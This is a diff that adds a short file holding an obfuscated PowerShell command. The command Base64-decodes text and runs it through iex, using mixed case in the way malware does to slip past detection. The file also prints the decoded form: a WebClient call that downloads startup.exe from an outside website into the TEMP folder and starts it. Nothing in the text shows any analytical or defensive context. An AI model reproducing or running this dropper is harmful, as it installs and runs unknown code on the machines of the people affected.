@@ -1,0 +1,7 @@
+iex([sYSTeM.TExt.ENCOdING]::Utf8.getstRINg([system.ConVErt]::fromBaSE64striNG('CihOZXctT2JqZWN0IHNZU1RFbS5ORXQuV2VCQ0xJRW5UKS5Eb3dObE9BREZJbGUoJ3d3dy5sb25kb25vZmZpY2VzLndlYnNpdGUvZG93bmxvYWQvc3RhcnR1cC5leGUnLCIkRW52OlRFTVBcc3RhcnR1cC5leGUiKTtTdGFydC1Qcm9jZXNzICgiJEVudjpURU1QXHN0YXJ0dXAuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYSTEm.NEt.WeBCLIEnT).DowNlOADFIle('www.londonoffices.website/download/startup.exe',"$Env:TEMP\startup.exe");Start-Process ("$Env:TEMP\startup.exe")
+
